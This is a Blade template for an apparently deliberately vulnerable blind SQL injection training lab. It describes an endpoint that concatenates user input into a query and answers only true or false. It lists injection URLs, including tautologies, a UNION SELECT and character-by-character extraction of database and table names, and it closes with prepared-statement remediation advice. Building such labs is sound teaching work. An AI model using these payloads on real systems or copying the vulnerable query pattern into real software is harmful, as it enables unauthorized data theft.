@extends('layouts.app')
@section('title', 'Blind SQLi Lab')

@section('content')
<div class="max-w-5xl mx-auto space-y-6">
    <div>
        <h1 class="text-3xl font-bold text-gray-800">Blind SQL Injection Lab</h1>
        <p class="text-gray-500 mt-1">GET-only boolean oracle: web app only answers CO or KHONG.</p>
    </div>

    <div class="bg-white rounded-xl shadow p-6 border border-rose-100">
        <h2 class="text-lg font-semibold text-rose-700 mb-4">Blind Probe Endpoint</h2>
        <p class="text-sm text-gray-600 mb-3">Vulnerable endpoint: <span class="font-mono">/sqli/blind/probe?id=...</span></p>

        <form method="GET" action="/sqli/blind/probe" class="space-y-3">
            <label class="block text-sm font-medium text-gray-700">Input for query parameter <span class="font-mono">id</span></label>
            <input
                type="text"
                name="id"
                value="{{ $id ?? '1' }}"
                class="w-full border rounded-lg px-3 py-2 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-rose-400"
                placeholder="1 OR 1=1"
            >
            <button class="bg-rose-600 hover:bg-rose-700 text-white px-4 py-2 rounded-lg transition">Run Probe</button>
        </form>

        <div class="mt-4 bg-gray-50 border rounded-lg p-3 text-xs text-gray-700">
            Controller executes SQL pattern: <span class="font-mono">SELECT id FROM users WHERE id = &lt;id&gt; LIMIT 1</span>
        </div>
    </div>

    <div class="bg-white rounded-xl shadow p-6 border border-gray-100 space-y-4">
        <h3 class="text-base font-semibold text-gray-800">Kich ban tan cong voi id (GET-only)</h3>

        <div>
            <p class="text-sm font-semibold text-gray-700 mb-2">1) Test dieu kien true/false co ban</p>
            <div class="space-y-2 text-xs font-mono">
                <div class="bg-gray-50 border rounded p-2 break-all">/sqli/blind/probe?id=1</div>
                <div class="bg-gray-50 border rounded p-2 break-all">/sqli/blind/probe?id=999999</div>
            </div>
        </div>

        <div>
            <p class="text-sm font-semibold text-gray-700 mb-2">2) Bypass bang id injection</p>
            <div class="space-y-2 text-xs font-mono">
                <div class="bg-gray-50 border rounded p-2 break-all">/sqli/blind/probe?id=1 OR 1=1</div>
                <div class="bg-gray-50 border rounded p-2 break-all">/sqli/blind/probe?id=1 AND 1=2</div>
                <div class="bg-gray-50 border rounded p-2 break-all">/sqli/blind/probe?id=0 UNION SELECT 1</div>
            </div>
        </div>

        <div>
            <p class="text-sm font-semibold text-gray-700 mb-2">3) Blind condition thong qua id payload</p>
            <div class="space-y-2 text-xs font-mono">
                <div class="bg-gray-50 border rounded p-2 break-all">/sqli/blind/probe?id=1 AND (SELECT COUNT(*) FROM users)&gt;0</div>
                <div class="bg-gray-50 border rounded p-2 break-all">/sqli/blind/probe?id=1 AND SUBSTRING(DATABASE(),1,1)='s'</div>
                <div class="bg-gray-50 border rounded p-2 break-all">/sqli/blind/probe?id=1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),1,1)='u'</div>
            </div>
        </div>
    </div>

    @isset($sql)
        <div class="bg-white rounded-xl shadow p-6 border border-gray-100 space-y-3">
            <h3 class="text-base font-semibold text-gray-800">Execution Result</h3>
            <div class="bg-gray-900 text-green-300 rounded-lg p-3 font-mono text-xs overflow-x-auto">{{ $sql }}</div>

            <div class="text-sm">
                @if(($messageType ?? '') === 'success')
                    <span class="inline-flex items-center px-3 py-1 rounded-full bg-green-100 text-green-700 font-medium">CO</span>
                @else
                    <span class="inline-flex items-center px-3 py-1 rounded-full bg-red-100 text-red-700 font-medium">KHONG</span>
                @endif
            </div>

            <p class="text-xs text-gray-500">Web app chi tra ve true/false oracle (CO/KHONG), khong tra truc tiep du lieu database.</p>
        </div>
    @endisset

    <div class="bg-amber-50 border border-amber-200 rounded-xl p-5 text-sm text-amber-900">
        <p class="font-semibold mb-1">Fix guidance (for remediation phase)</p>
        <p>Replace string-concatenated WHERE clauses with prepared statements and never expose binary oracle responses for attacker-controlled conditions.</p>
    </div>
</div>
@endsection
